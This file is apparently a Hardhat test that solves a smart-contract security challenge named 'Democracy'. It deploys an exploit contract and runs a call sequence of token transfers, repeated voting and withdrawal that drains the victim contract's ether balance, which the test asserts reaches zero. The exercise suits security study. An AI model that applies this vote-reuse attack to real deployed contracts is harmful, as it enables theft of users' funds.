const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Democracy";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();
        const value = ethers.utils.parseEther("1");

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy({ value });

        return { victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ victimContract, attackerWallet } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {
            const Exploit = await ethers.getContractFactory("DemocracyExploit");

            const exploit = await Exploit.deploy(victimContract.address, { gasLimit: 1_000_000 });

            await victimContract.connect(attackerWallet).nominateChallenger(attackerWallet.address);
            await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, exploit.address, 0);
            await victimContract.connect(attackerWallet).vote(attackerWallet.address);

            await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, exploit.address, 1);
            await exploit.connect(attackerWallet).vote();

            await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
        });

        after(async function () {
            const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
            expect(victimContractBalance).to.be.equal("0");
        });
    });
});
